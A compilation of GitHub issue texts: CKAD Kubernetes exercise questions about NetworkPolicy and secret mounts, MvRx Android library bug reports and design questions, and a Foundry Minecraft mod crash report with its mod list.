kubectl run busybox --image=busybox --rm -it --restart=Never -- wget -O- http://nginx:80                       # This should not work but it works fine

kubectl run busybox --image=busybox --rm -it --restart=Never --labels=access=true -- wget -O- http://nginx:80  # This should be fine
```

I am using the latest minikube in Ubuntu 16.04

```sh
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"14", GitVersion:"v1.14.2", GitCommit:"66049e3b21efe110454d67df4fa62b08ea79a19b", GitTreeState:"clean", BuildDate:"2019-05-16T16:23:09Z", GoVersion:"go1.12.5", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"10", GitVersion:"v1.10.0", GitCommit:"fc32d2f3698e36b93322a3465f63a14e9f0eaead", GitTreeState:"clean", BuildDate:"2018-03-26T16:44:10Z", GoVersion:"go1.9.3", Compiler:"gc", Platform:"linux/amd64"}
```

 I don't have rights to submit a new branch and PR to your repo, so here are the details:

### Create a second pod (deployed to the same node the first pod is on) which is identical with the one you just created (you can easily do it by changing the 'name' property on pod.yaml). Connect to it and verify that '/etc/foo' contains the 'passwd' file. Delete pods to cleanup

<details><summary>show</summary>
<p>

Create the second pod, called busybox2:

```bash
# get details about the first pod
# take the node name from the 7th column
# remove the title/header line
# add a label to that node
kubectl get pods busybox -o wide | awk '{print $7}' | grep -v NODE | xargs -I{} kubectl label node {} use=thisone
vim pod.yaml
# change 'metadata.name: busybox' to 'metadata.name: busybox2'
# add a nodeSelector with the same label as the node to the yaml
kubectl create -f pod.yaml
kubectl exec busybox2 -- ls /etc/foo # will show 'passwd'
# cleanup
kubectl delete po busybox busybox2
``` I am getting below error when I pass `--rm` flag as shown in the solution for 3rd questions of Services and Networking section.

`error: --rm should only be used for attached containers`. 

Any idea why? In the exercise for applying a network policy, the command a busybox without the label also return nginx home page. 

```sh
kubectl run busybox --image=busybox --rm -it --restart=Never -- wget -O- http://nginx:80                       # This should not work but it works fine

kubectl run busybox --image=busybox --rm -it --restart=Never --labels=access=true -- wget -O- http://nginx:80  # This should be fine
```
 Would you say that if you're able to solve this problems within a reasonable time, you are well prepared for the CKAD? https://github.com/dgkanatsios/CKAD-exercises/blob/master/c.pod_design.md#check-the-annotations-for-pod-nginx1

> As an alternative to using | grep you can use jsonPath like -o jsonpath='{.metadata.annotations}{"\n"}'

:) I am getting below error when I pass `--rm` flag as shown in the solution for 3rd questions of Services and Networking section.

`error: --rm should only be used for attached containers`. 

Any idea why?
<---------->
139500036
I think it's more flexible if we can expose MvRxStateStore, so that developers who favor composition over inheritance can still use it without subclassing MvRx. It also helps the developers who only wanna use the state management part of the library. 
 Any good source code example how to use MvRx together with PagedListEpoxyController and state/error handling? version:
api 'com.airbnb.android:mvrx:1.3.0'

error:
![image](https://user-images.githubusercontent.com/11989916/69204780-8136f680-0b7a-11ea-97f0-566a013ed214.png)
 version:
api 'com.airbnb.android:mvrx:1.3.0'

error:
![image](https://user-images.githubusercontent.com/11989916/69204780-8136f680-0b7a-11ea-97f0-566a013ed214.png)
 The docs advises setting UI event listeners from the fragment and calling the fragment ViewModel when necessary, but I was wondering if there is an issue with making the ViewModel an epoxy model property and handling events directly through its methods.

```
...
<EditText onTextChanged="@{viewModel::handleTextChange}" />
...
<layout>
   <data>
       <variable name="viewModel" type="ViewModel" />
   </data>
</layout>
```

The other thing is if it makes sense to make a ViewModel an epoxy model property, could the ViewModel (state) properties be used in the model to bind data? Minify is not enabled. Project is using dynamic feature modules setup.

#245 was closed as duplicate but I'm failing to find the duplicate mentioned there.

I'm at a bit of a loss here. Any guidance would be greatly appreciated.

```
E/AndroidRuntime: FATAL EXCEPTION: RxComputationThreadPool-1
    Process: com.mypackage.name.debug, PID: 12051
    io.reactivex.exceptions.OnErrorNotImplementedException: The exception was not handled due to missing onError handler in the subscribe() method call. Further reading: https://github.com/ReactiveX/RxJava/wiki/Error-Handling | java.lang.AssertionError: Built-in class kotlin.Any is not found
        at io.reactivex.internal.observers.EmptyCompletableObserver.onError(EmptyCompletableObserver.java:50)
        at io.reactivex.internal.operators.completable.CompletableSubscribeOn$SubscribeOnObserver.onError(CompletableSubscribeOn.java:74)
        at io.reactivex.internal.operators.completable.CompletableFromCallable.subscribeActual(CompletableFromCallable.java:40)
        at io.reactivex.Completable.subscribe(Completable.java:2309)
        at io.reactivex.internal.operators.completable.CompletableSubscribeOn$SubscribeOnObserver.run(CompletableSubscribeOn.java:64)
        at io.reactivex.internal.schedulers.ScheduledDirectTask.call(ScheduledDirectTask.java:38)
        at io.reactivex.internal.schedulers.ScheduledDirectTask.call(ScheduledDirectTask.java:26)
        at java.util.concurrent.FutureTask.run(FutureTask.java:266)
        at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:301)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
        at java.lang.Thread.run(Thread.java:919)
     Caused by: java.lang.AssertionError: Built-in class kotlin.Any is not found
        at kotlin.reflect.jvm.internal.impl.builtins.KotlinBuiltIns$3.invoke(KotlinBuiltIns.java:113)
        at kotlin.reflect.jvm.internal.impl.builtins.KotlinBuiltIns$3.invoke(KotlinBuiltIns.java:108)
        at kotlin.reflect.jvm.internal.impl.storage.LockBasedStorageManager$MapBasedMemoizedFunction.invoke(LockBasedStorageManager.java:440)
        at kotlin.reflect.jvm.internal.impl.storage.LockBasedStorageManager$MapBasedMemoizedFunctionToNotNull.invoke(LockBasedStorageManager.java:515)
        at kotlin.reflect.jvm.internal.impl.builtins.KotlinBuiltIns.getBuiltInClassByName(KotlinBuiltIns.java:362)
        at kotlin.reflect.jvm.internal.impl.builtins.KotlinBuiltIns.getAny(KotlinBuiltIns.java:367)
        at kotlin.reflect.jvm.internal.impl.builtins.KotlinBuiltIns.getAnyType(KotlinBuiltIns.java:642)
        at kotlin.reflect.jvm.internal.impl.descriptors.NotFoundClasses$MockClassDescriptor.<init>(NotFoundClasses.kt:59)
        at kotlin.reflect.jvm.internal.impl.descriptors.NotFoundClasses$classes$1.invoke(NotFoundClasses.kt:43)
        at kotlin.reflect.jvm.internal.impl.descriptors.NotFoundClasses$classes$1.invoke(NotFoundClasses.kt:21)
        at kotlin.reflect.jvm.internal.impl.storage.LockBasedStorageManager$MapBasedMemoizedFunction.invoke(LockBasedStorageManager.java:440)
        at kotlin.reflect.jvm.internal.impl.storage.LockBasedStorageManager$MapBasedMemoizedFunctionToNotNull.invoke(LockBasedStorageManager.java:515)
        at kotlin.reflect.jvm.internal.impl.descriptors.NotFoundClasses.getClass(NotFoundClasses.kt:91)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.TypeDeserializer$typeConstructor$1.invoke(TypeDeserializer.kt:109)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.TypeDeserializer.typeConstructor(TypeDeserializer.kt:113)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.TypeDeserializer.simpleType(TypeDeserializer.kt:75)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.TypeDeserializer.type(TypeDeserializer.kt:63)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.MemberDeserializer.valueParameters(MemberDeserializer.kt:417)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.MemberDeserializer.loadConstructor(MemberDeserializer.kt:342)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor.computePrimaryConstructor(DeserializedClassDescriptor.kt:115)
E/AndroidRuntime:     at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor.access$computePrimaryConstructor(DeserializedClassDescriptor.kt:32)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor$primaryConstructor$1.invoke(DeserializedClassDescriptor.kt:59)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor$primaryConstructor$1.invoke(DeserializedClassDescriptor.kt:32)
        at kotlin.reflect.jvm.internal.impl.storage.LockBasedStorageManager$LockBasedLazyValue.invoke(LockBasedStorageManager.java:346)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor.getUnsubstitutedPrimaryConstructor(DeserializedClassDescriptor.kt:119)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor.computeConstructors(DeserializedClassDescriptor.kt:122)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor.access$computeConstructors(DeserializedClassDescriptor.kt:32)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor$constructors$1.invoke(DeserializedClassDescriptor.kt:60)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor$constructors$1.invoke(DeserializedClassDescriptor.kt:32)
        at kotlin.reflect.jvm.internal.impl.storage.LockBasedStorageManager$LockBasedLazyValue.invoke(LockBasedStorageManager.java:346)
        at kotlin.reflect.jvm.internal.impl.storage.LockBasedStorageManager$LockBasedNotNullLazyValue.invoke(LockBasedStorageManager.java:402)
        at kotlin.reflect.jvm.internal.impl.serialization.deserialization.descriptors.DeserializedClassDescriptor.getConstructors(DeserializedClassDescriptor.kt:130)
        at kotlin.reflect.jvm.internal.KClassImpl.getConstructorDescriptors(KClassImpl.kt:200)
        at kotlin.reflect.jvm.internal.KClassImpl$Data$constructors$2.invoke(KClassImpl.kt:91)
        at kotlin.reflect.jvm.internal.KClassImpl$Data$constructors$2.invoke(KClassImpl.kt:44)
        at kotlin.reflect.jvm.internal.ReflectProperties$LazySoftVal.invoke(ReflectProperties.java:92)
        at kotlin.reflect.jvm.internal.ReflectProperties$Val.getValue(ReflectProperties.java:31)
        at kotlin.reflect.jvm.internal.KClassImpl$Data.getConstructors(Unknown Source:7)
        at kotlin.reflect.jvm.internal.KClassImpl.getConstructors(KClassImpl.kt:235)
        at kotlin.reflect.full.KClasses.getPrimaryConstructor(KClasses.kt:40)
        at com.airbnb.mvrx.BaseMvRxViewModel.warmReflectionCache(BaseMvRxViewModel.kt:69)
        at com.airbnb.mvrx.BaseMvRxViewModel$1.call(BaseMvRxViewModel.kt:48)
        at com.airbnb.mvrx.BaseMvRxViewModel$1.call(BaseMvRxViewModel.kt:31)
        at io.reactivex.internal.operators.completable.CompletableFromCallable.subscribeActual(CompletableFromCallable.java:36)
        	... 9 more
``` I use navigation to jump the fragment, and when I go back to the previous fragment it reloads the init call.
This is probably because of navigation. I would like to ask if you have any good solutions? What is the best way to get the view model for the parent fragment?
Would prefer to not scope it to the activity.

I did try to create my own extension function based on `fragmentViewModel` but `lifecycleAwareLazy`, `MvRxViewModelProvider` and a few others are private. What are your thoughts on property getters on the state?

Some examples:

``` kotlin
val isLoading: Boolean
    get() = data is Incomplete
```

``` kotlin
val canSubmit: Boolean
    get() = !isPerformingAction && error == null && !note.isNullOrEmpty() && deliveryDate != null && hasOneOrMoreItems
``` Some of my users see a crash with following stacktrace: 
```
Fatal Exception: java.lang.IndexOutOfBoundsException: Inconsistency detected. Invalid item position 3(offset:-1).state:12 com.airbnb.epoxy.EpoxyRecyclerView{6a5d775 VFED..... ......ID 0,277-1080,933 #7f0a013d app:id/recycler_view}, adapter:com.airbnb.epoxy.EpoxyControllerAdapter@5bbe693, layout:androidx.recyclerview.widget.GridLayoutManager@9f426d0, context:com.smartfoxlabs.stickerland.MainActivity@e2501d0
       at androidx.recyclerview.widget.RecyclerView$Recycler.tryGetViewHolderForPositionByDeadline + 6162(RecyclerView.java:6162)
       at androidx.recyclerview.widget.RecyclerView$Recycler.getViewForPosition + 6097(RecyclerView.java:6097)
       at androidx.recyclerview.widget.RecyclerView$Recycler.getViewForPosition + 6093(RecyclerView.java:6093)
       at androidx.recyclerview.widget.LinearLayoutManager$LayoutState.next + 2303(LinearLayoutManager.java:2303)
       at androidx.recyclerview.widget.GridLayoutManager.layoutChunk + 561(GridLayoutManager.java:561)
       at androidx.recyclerview.widget.LinearLayoutManager.fill + 1587(LinearLayoutManager.java:1587)
       at androidx.recyclerview.widget.LinearLayoutManager.onLayoutChildren + 675(LinearLayoutManager.java:675)
       at androidx.recyclerview.widget.GridLayoutManager.onLayoutChildren + 170(GridLayoutManager.java:170)
       at androidx.recyclerview.widget.RecyclerView.dispatchLayoutStep1 + 4066(RecyclerView.java:4066)
       at androidx.recyclerview.widget.RecyclerView.dispatchLayout + 3830(RecyclerView.java:3830)
       at androidx.recyclerview.widget.RecyclerView.consumePendingUpdateOperations + 1911(RecyclerView.java:1911)
       at androidx.recyclerview.widget.RecyclerView$1.run + 416(RecyclerView.java:416)
       at android.view.Choreographer$CallbackRecord.run + 1092(Choreographer.java:1092)
       at android.view.Choreographer.doCallbacks + 893(Choreographer.java:893)
       at android.view.Choreographer.doFrame + 809(Choreographer.java:809)
       at android.view.Choreographer$FrameDisplayEventReceiver.run + 1078(Choreographer.java:1078)
       at android.os.Handler.handleCallback + 907(Handler.java:907)
       at android.os.Handler.dispatchMessage + 105(Handler.java:105)
       at android.os.Looper.loop + 216(Looper.java:216)
       at android.app.ActivityThread.main + 7625(ActivityThread.java:7625)
       at java.lang.reflect.Method.invoke(Method.java)
       at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run + 524(RuntimeInit.java:524)
       at com.android.internal.os.ZygoteInit.main + 987(ZygoteInit.java:987)
```

The only possible cause that I currently think is that data is updating way too often with different operations add/remove/move What do you think about Jetpack Compose?
Would you use MvRx in a greenfield project knowing that the native solution from Google will be production ready soon?  The `helloDagger` module's `targetSDK` is set version 29, but it looks like Travis builds targeting that version fail with the following error:

```text
Failed to install the following Android SDK packages as some licences have not been accepted.
  platforms;android-29 Android SDK Platform 29

To build this project, accept the SDK license agreements and install the missing components using the Android Studio SDK Manager.

Alternatively, to transfer the license agreements from one workstation to another, see http://d.android.com/r/studio-ui/export-licenses.html

Using Android SDK: /usr/local/android-sdk
```

A simple solution would be to drop the target SDK to version 28 for `helloDagger`. @BenSchwab  The new testing artifact's pom has a dependency that is not available. This seems like a mistake

https://repo1.maven.org/maven2/com/airbnb/android/mvrx-testing/0.7.0/mvrx-testing-0.7.0.pom

![image](https://user-images.githubusercontent.com/763339/51121435-b87c9e80-1817-11e9-824c-4fde2af6a293.png)

Workaround:
```
    testImplementation('com.airbnb.android:mvrx-testing:0.7.0') {
        exclude group: 'MvRx'
    }
```
 The new testing artifact's pom has a dependency that is not available. This seems like a mistake

https://repo1.maven.org/maven2/com/airbnb/android/mvrx-testing/0.7.0/mvrx-testing-0.7.0.pom

![image](https://user-images.githubusercontent.com/763339/51121435-b87c9e80-1817-11e9-824c-4fde2af6a293.png)

Workaround:
```
    testImplementation('com.airbnb.android:mvrx-testing:0.7.0') {
        exclude group: 'MvRx'
    }
```
 The code is: `interface MvRxViewModelFactory<VM : BaseMvRxViewModel<S>, S : MvRxState>`

However, the Wiki has it swapped. `MvRxViewModelFactory<MyState, MyViewModel>`

Unfortunately, I make a PR for the wiki.  In the version [0.7.0](https://github.com/airbnb/MvRx/tree/v0.7.0), the class [MvRxViewModelProvider](https://github.com/airbnb/MvRx/blob/v0.7.0/mvrx/src/main/kotlin/com/airbnb/mvrx/MvRxViewModelProvider.kt) was changed. It uses reflection for [getting initialState method of the companion object](https://github.com/airbnb/MvRx/blob/v0.7.0/mvrx/src/main/kotlin/com/airbnb/mvrx/MvRxViewModelProvider.kt#L92). The app will crash If you enable Proguard because it'll not find `initialState` method of the companion object.
`Caused by: java.lang.NoSuchMethodException: initialState [class com.airbnb.mvrx.ViewModelContext]
        at java.lang.Class.getMethod(Class.java:624)
        at java.lang.Class.getMethod(Class.java:603)
        at com.airbnb.mvrx.MvRxViewModelProvider.createInitialState(MvRxViewModelProvider.kt:96)
        at com.airbnb.mvrx.MvRxViewModelProvider.createViewModel$mvrx_release(MvRxViewModelProvider.kt:47)
        at com.airbnb.mvrx.MvRxViewModelProvider.createViewModel$mvrx_release$default(MvRxViewModelProvider.kt:45)
        at com.airbnb.mvrx.MvRxViewModelProvider$get$factory$1.invoke(MvRxViewModelProvider.kt:33)
        at com.airbnb.mvrx.MvRxViewModelProvider$get$factory$1.invoke(MvRxViewModelProvider.kt:14)
        at com.airbnb.mvrx.MvRxFactory.create(MvRxFactory.kt:9)
        at androidx.lifecycle.ViewModelProvider.get(ViewModelProvider.java:135)
        at com.airbnb.mvrx.MvRxViewModelProvider.get(MvRxViewModelProvider.kt:37)`

I suggest the following:
- Add corresponding rules to the library Proguard configuration, something like this `-keep class * implements com.airbnb.mvrx.MvRxViewModelFactory { *; }`
- Add building of release version of the samples with enabled Proguard and [execute it with an emulator](https://docs.travis-ci.com/user/languages/android/#how-to-create-and-start-an-emulator) for release versions of the library by CI server. I think it should help with preventing that kind of error in the future. 
I'll create a pull request for the changes if have time this week.

Also, thank you for the good library, I really enjoy to use it :)

 Login Screen
-    If user enter wrong username and password
-    Click on Login button
-    Getting error in onFail method call (Working perfect)
-    Then again user enter wrong password
-    Click on login button
-    Here required call again "onFail method" 

`    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        viewModel.selectSubscribe(LoginState::request) {
            when (it) {
                is Loading -> {
                    Timber.d("Loading..")
                } 
                is Success -> {
                    Timber.d("API call success")
                } 
                is Fail -> {
                    Timber.d("errorr " + it.toString())
                    val loginError = it.error.prettyLoginMessage()
                    alert(loginError!!, "Failure") {
                        okButton {}
                    }.show()
                }
            }
        }
    }
`

![ezgif com-video-to-gif](https://user-images.githubusercontent.com/41906092/50465711-f9268c00-09be-11e9-9d4e-1172181776e0.gif)


 As I mentioned in #79. MvRx enforces immutability of state, so we can't use `SparseArray` in state. Suggestion of MvRx is using  immutable list instead, but that would loss the performance advantages of SparseArray. I put SparseArray in `LiveData` and remove it from the state, but that can be buggy. So what's the best way to use SparseArray? @BenSchwab 
<---------->
139619595
Thought I would leave this here:
https://paste.dimdev.org/haqasurexi.mccrash So, Im trying to add/change the fluid fuels for the heater and Im getting an error looking for **Definition** instead of **Stack**

At least, I have no idea how to use Definition, yet.
Here is the script
`FluidHeater.addFuel(<liquid:lava>, 210000);`
(I imported the mods.foundry.* stuff)

Usually this works for most mods that use liquids, but this one asks for definitions, and Im currently reading about what exactly that is. Base Metals, Modern Metals, and Base Minerals all add numerous ores and armor/blocks/tools made from those ores. It would be awesome to see some casting support for these items. It seems that despite having everything in, the Alloy Mixer doesnt seem to mix Thermal Expansion special alloys.
I tried all three of Signalum, Enderium, and Lumium and none of them mix.

Electrum and Constantan works, however.
I too have EMBERS: REKINDLED which overtakes this mod's molten forms for the vanilla metals and some common metals like Silver, Lead and Copper. This may or may not factor in this.
Im going to try a crafttweaked recipe and see if that can bypass this. ---- Minecraft Crash Report ----

WARNING: coremods are present:
  ForgelinPlugin (Forgelin-1.8.3.jar)
  IELoadingPlugin (ImmersiveEngineering-core-0.12-89.jar)
  Do not report to Forge! (If you haven't disabled the FoamFix coremod, try disabling it in the config! Note that this bit of text will still appear.) (foamfix-0.10.5-1.12.2.jar)
  LoadingPlugin (ResourceLoader-MC1.12.1-1.5.3.jar)
  BetterFoliageLoader (BetterFoliage-MC1.12-2.2.0.jar)
  MovingWorldCore (movingworld-1.12-6.342-full.jar)
  CTMCorePlugin (CTM-MC1.12.2-0.3.3.22.jar)
  LoadingPlugin (BetterWithLib-1.12-1.5.jar)
Contact their authors BEFORE contacting forge

// I'm sorry, Dave.

Time: 7/9/19 6:49 PM
Description: There was a severe problem during mod loading that has caused the game to fail

net.minecraftforge.fml.common.LoaderExceptionModCrash: Caught exception from Zen: Foundry (foundry)
Caused by: java.lang.ArrayIndexOutOfBoundsException: 32767
	at net.dries007.tfc.objects.Gem$Grade.fromMeta(Gem.java:34)
	at net.dries007.tfc.objects.items.ItemGem.getGradeFromStack(ItemGem.java:57)
	at net.dries007.tfc.objects.items.ItemGem.func_77667_c(ItemGem.java:63)
	at net.minecraft.item.ItemStack.func_77977_a(ItemStack.java:509)
	at exter.foundry.util.hashstack.HashableItem.hashCode(HashableItem.java:76)
	at java.util.HashMap.hash(Unknown Source)
	at java.util.HashMap.put(Unknown Source)
	at exter.foundry.material.MaterialRegistry.registerItem(MaterialRegistry.java:86)
	at exter.foundry.init.InitRecipes.postInit(InitRecipes.java:56)
	at exter.foundry.Foundry.postInit(Foundry.java:127)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at net.minecraftforge.fml.common.FMLModContainer.handleModStateEvent(FMLModContainer.java:637)
	at sun.reflect.GeneratedMethodAccessor8.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:91)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:150)
	at com.google.common.eventbus.Subscriber$1.run(Subscriber.java:76)
	at com.google.common.util.concurrent.MoreExecutors$DirectExecutor.execute(MoreExecutors.java:399)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:71)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:116)
	at com.google.common.eventbus.EventBus.post(EventBus.java:217)
	at net.minecraftforge.fml.common.LoadController.sendEventToModContainer(LoadController.java:219)
	at net.minecraftforge.fml.common.LoadController.propogateStateMessage(LoadController.java:197)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:91)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:150)
	at com.google.common.eventbus.Subscriber$1.run(Subscriber.java:76)
	at com.google.common.util.concurrent.MoreExecutors$DirectExecutor.execute(MoreExecutors.java:399)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:71)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:116)
	at com.google.common.eventbus.EventBus.post(EventBus.java:217)
	at net.minecraftforge.fml.common.LoadController.distributeStateMessage(LoadController.java:136)
	at net.minecraftforge.fml.common.Loader.initializeMods(Loader.java:749)
	at net.minecraftforge.fml.client.FMLClientHandler.finishMinecraftLoading(FMLClientHandler.java:336)
	at net.minecraft.client.Minecraft.func_71384_a(Minecraft.java:535)
	at net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:378)
	at net.minecraft.client.main.Main.main(SourceFile:123)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at net.minecraft.launchwrapper.Launch.launch(Launch.java:135)
	at net.minecraft.launchwrapper.Launch.main(Launch.java:28)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.multimc.onesix.OneSixLauncher.launchWithMainClass(OneSixLauncher.java:196)
	at org.multimc.onesix.OneSixLauncher.launch(OneSixLauncher.java:231)
	at org.multimc.EntryPoint.listen(EntryPoint.java:143)
	at org.multimc.EntryPoint.main(EntryPoint.java:34)


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- System Details --
Details:
	Minecraft Version: 1.12.2
	Operating System: Windows 10 (amd64) version 10.0
	Java Version: 1.8.0_211, Oracle Corporation
	Java VM Version: Java HotSpot(TM) 64-Bit Server VM (mixed mode), Oracle Corporation
	Memory: 724631672 bytes (691 MB) / 2286419968 bytes (2180 MB) up to 3817865216 bytes (3641 MB)
	JVM Flags: 3 total; -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xms512m -Xmx4096m
	IntCache: cache: 0, tcache: 0, allocated: 0, tallocated: 0
	FML: MCP 9.42 Powered by Forge 14.23.5.2838 61 mods loaded, 61 mods active
	States: 'U' = Unloaded 'L' = Loaded 'C' = Constructed 'H' = Pre-initialized 'I' = Initialized 'J' = Post-initialized 'A' = Available 'D' = Disabled 'E' = Errored

	| State | ID                                           | Version           | Source                                             | Signature                                |
	|:----- |:-------------------------------------------- |:----------------- |:-------------------------------------------------- |:---------------------------------------- |
	| LCHIJ | minecraft                                    | 1.12.2            | minecraft.jar                                      | None                                     |
	| LCHIJ | mcp                                          | 9.42              | minecraft.jar                                      | None                                     |
	| LCHIJ | FML                                          | 8.0.99.99         | forge-1.12.2-14.23.5.2838-universal.jar            | e3c3d50c7c986df74c645c0ac54639741c90a557 |
	| LCHIJ | forge                                        | 14.23.5.2838      | forge-1.12.2-14.23.5.2838-universal.jar            | e3c3d50c7c986df74c645c0ac54639741c90a557 |
	| LCHIJ | com.elytradev.movingworld.common.asm.coremod |                   | minecraft.jar                                      | None                                     |
	| LCHIJ | foamfixcore                                  | 7.7.4             | minecraft.jar                                      | None                                     |
	| LCHIJ | engineersdecor                               | 1.0.8             | engineersdecor-1.12.2-1.0.8.jar                    | ed58ed655893ced6280650866985abcae2bf7559 |
	| LCHIJ | crafttweaker                                 | 4.1.19            | CraftTweaker2-1.12-4.1.19.jar                      | None                                     |
	| LCHIJ | mtlib                                        | 3.0.6             | MTLib-3.0.6.jar                                    | None                                     |
	| LCHIJ | modtweaker                                   | 4.0.17            | modtweaker-4.0.17.jar                              | None                                     |
	| LCHIJ | jei                                          | 4.15.0.268        | jei_1.12.2-4.15.0.268.jar                          | None                                     |
	| LCHIJ | railcraft                                    | 12.0.0            | railcraft-12.0.0.jar                               | a0c255ac501b2749537d5824bb0f0588bf0320fa |
	| LCHIJ | redstoneflux                                 | 2.1.0             | RedstoneFlux-1.12-2.1.0.6-universal.jar            | 8a6abf2cb9e141b866580d369ba6548732eff25f |
	| LCHIJ | cofhcore                                     | 4.6.3             | CoFHCore-1.12.2-4.6.3.27-universal.jar             | None                                     |
	| LCHIJ | cofhworld                                    | 1.3.1             | CoFHWorld-1.12.2-1.3.1.7-universal.jar             | 8a6abf2cb9e141b866580d369ba6548732eff25f |
	| LCHIJ | thermalfoundation                            | 2.6.3             | ThermalFoundation-1.12.2-2.6.3.27-universal.jar    | 8a6abf2cb9e141b866580d369ba6548732eff25f |
	| LCHIJ | immersiveengineering                         | 0.12-89           | ImmersiveEngineering-0.12-89.jar                   | 4cb49fcde3b43048c9889e0a3d083225da926334 |
	| LCHIJ | alternatingflux                              | 0.12.2-2          | alternatingflux-0.12.2-2.jar                       | None                                     |
	| LCHIJ | astikorcarts                                 | 1.12.2-0.1.2.7    | astikorcarts-1.12.2-0.1.2.7.jar                    | None                                     |
	| LCHIJ | base                                         | 3.13.0            | base-1.12.2-3.13.0.jar                             | None                                     |
	| LCHIJ | forgelin                                     | 1.8.3             | Forgelin-1.8.3.jar                                 | None                                     |
	| LCHIJ | betterfoliage                                | 2.2.0             | BetterFoliage-MC1.12-2.2.0.jar                     | None                                     |
	| LCHIJ | betterstorage                                | 3.0.0.2           | BetterStorageToo-1.12.2-3.0.0.2.jar                | None                                     |
	| LCHIJ | betterwithlib                                | ${version}        | BetterWithLib-1.12-1.5.jar                         | None                                     |
	| LCHIJ | ctm                                          | MC1.12.2-0.3.3.22 | CTM-MC1.12.2-0.3.3.22.jar                          | None                                     |
	| LCHIJ | reborncore                                   | 3.13.12.447       | RebornCore-1.12.2-3.13.12.447-universal.jar        | 8727a3141c8ec7f173b87aa78b9b9807867c4e6b |
	| LCHIJ | techreborn                                   | 2.22.1.979        | TechReborn-1.12.2-2.22.1.979-universal.jar         | 8727a3141c8ec7f173b87aa78b9b9807867c4e6b |
	| LCHIJ | betterwithmods                               | 1.12-2.3.20-1027  | BetterWithMods-1.12-2.3.20-1027.jar                | None                                     |
	| LCHIJ | ceramics                                     | 1.12-1.3.7        | Ceramics-1.12-1.3.7.jar                            | None                                     |
	| LCHIJ | contenttweaker                               | 1.12.2-4.9.1      | ContentTweaker-1.12.2-4.9.1.jar                    | None                                     |
	| LCHIJ | cosmeticarmorreworked                        | 1.12.2-v4a        | CosmeticArmorReworked-1.12.2-v4a.jar               | aaaf83332a11df02406e9f266b1b65c1306f0f76 |
	| LCHIJ | ctgui                                        | 1.0.0             | CraftTweaker2-1.12-4.1.19.jar                      | None                                     |
	| LCHIJ | crafttweakerjei                              | 2.0.3             | CraftTweaker2-1.12-4.1.19.jar                      | None                                     |
	| LCHIJ | movingworld                                  | 1.12-6.342        | movingworld-1.12-6.342-full.jar                    | None                                     |
	| LCHIJ | davincisvessels                              | @DVESSELSVER@     | davincisvessels-1.12-6.340-full.jar                | None                                     |
	| LCHIJ | earthworks                                   | 1.3.4.3           | Earthworks-1.12-1.3.6.jar                          | None                                     |
	| LCHIJ | engineersdoors                               | 0.8.0             | engineers_doors-1.12.2-0.8.0.jar                   | None                                     |
	| LCHIJ | finite-water-control                         | 1.0               | finite-water-control-1.12-1.0.jar                  | None                                     |
